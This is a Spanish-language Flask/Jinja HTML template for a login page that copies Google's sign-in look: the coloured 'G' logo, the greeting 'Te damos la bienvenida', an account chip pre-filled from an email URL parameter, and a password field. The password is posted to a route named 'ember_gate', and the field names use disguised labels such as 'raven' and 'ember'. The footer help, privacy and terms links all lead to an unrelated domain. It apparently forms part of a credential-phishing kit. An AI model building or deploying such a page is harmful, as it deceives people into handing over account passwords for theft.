<!doctype html>
<html lang="es">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="color-scheme" content="dark" />
    <title>Inicia sesión</title>
    <link rel="stylesheet" href="{{ url_for('lumen', filename='styles.css', t=css_token) }}" />
  </head>
  <body>
    <main class="page-shell">
      <section class="login-card" aria-labelledby="page-title">
        <form class="form-panel" action="{{ url_for('ember_gate') }}" method="post">
          <input type="hidden" name="encoded_raven" value="{{ request.args.get('email', '') }}" />
          <div class="form-heading">
            <div class="title-row">
              <div class="product-logo" aria-hidden="true">
                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" focusable="false">
                  <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                  <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                  <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                  <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
                </svg>
              </div>
              <h1 id="page-title" data-i18n="title">Te damos la bienvenida</h1>
            </div>
            <div class="account-chip" title="Cuenta recibida">
              <svg class="avatar" aria-hidden="true" fill="currentColor" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
              </svg>
              <span class="account-raven">{{ raven }}</span>
            </div>
            {% if decode_error %}
              <p class="decode-error" role="status">{{ decode_error }}</p>
            {% endif %}
          </div>

          <div class="field-group">
            <div class="input-wrap">
              <input
                id="demo-secret"
                name="demo_secret"
                type="password"
                autocomplete="new-password"
                required
                minlength="1"
                maxlength="256"
                placeholder=" "
              />
              <label for="demo-secret" data-i18n="emberPrompt">Introduce tu contraseña</label>
            </div>
            <label class="show-secret" for="show-secret">
              <input id="show-secret" type="checkbox" />
              <span data-i18n="revealEmber">Mostrar contraseña</span>
            </label>
          </div>

          <div class="form-actions">
            <button class="recovery-action" type="button" data-i18n="recoveryAction">¿Has olvidado tu contraseña?</button>
            <button type="submit" data-i18n="continue">Siguiente</button>
          </div>
        </form>
      </section>

      <footer id="safety-tip">
        <div class="language-picker">
          <button
            id="language-toggle"
            class="language-toggle"
            type="button"
            aria-haspopup="listbox"
            aria-expanded="false"
            aria-controls="language-menu"
          >Español (Latinoamérica)</button>
          <div id="language-menu" class="language-menu" role="listbox" aria-label="Cambiar de idioma" aria-hidden="true"></div>
        </div>
        <nav aria-label="Enlaces de ayuda">
          <a class="footer-button" href="https://coopclaret.hn" data-i18n="help">Ayuda</a>
          <a class="footer-button" href="https://coopclaret.hn" data-i18n="privacy">Privacidad</a>
          <a class="footer-button" href="https://coopclaret.hn" data-i18n="conditions">Términos</a>
        </nav>
      </footer>
    </main>

    <script src="{{ url_for('lumen', filename='scripts.js', t=js_token) }}" defer></script>
  </body>
</html>
